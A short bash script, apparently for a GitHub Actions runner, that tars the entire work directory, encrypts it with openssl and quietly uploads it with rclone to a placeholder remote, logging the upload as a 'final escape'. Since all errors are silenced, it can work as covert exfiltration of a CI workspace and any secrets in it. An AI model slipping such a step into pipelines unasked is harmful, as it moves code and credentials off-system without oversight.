#!/bin/bash
set -u

BACKUP_PASS="${BACKUP_PASS:-}"
REMOTE="your-remote"
REMOTE_PATH="backups/actions/final"
WORK="/home/runner/work"

[ -z "$BACKUP_PASS" ] && exit 0

tar -czf /tmp/final.tar.gz -C "$WORK" . 2>/dev/null || exit 0

openssl enc -aes-256-cbc -pbkdf2 -salt \
  -in /tmp/final.tar.gz \
  -out /tmp/final.enc \
  -pass pass:"$BACKUP_PASS" 2>/dev/null || exit 0

STAMP=$(date +%Y%m%d-%H%M%S)-$RANDOM
rclone copy /tmp/final.enc \
  "$REMOTE:$REMOTE_PATH/final-$STAMP.enc" \
  --no-traverse --quiet 2>/dev/null

echo "[$(date +%T)] final escape: final-$STAMP.enc"
rm -f /tmp/final.tar.gz /tmp/final.enc
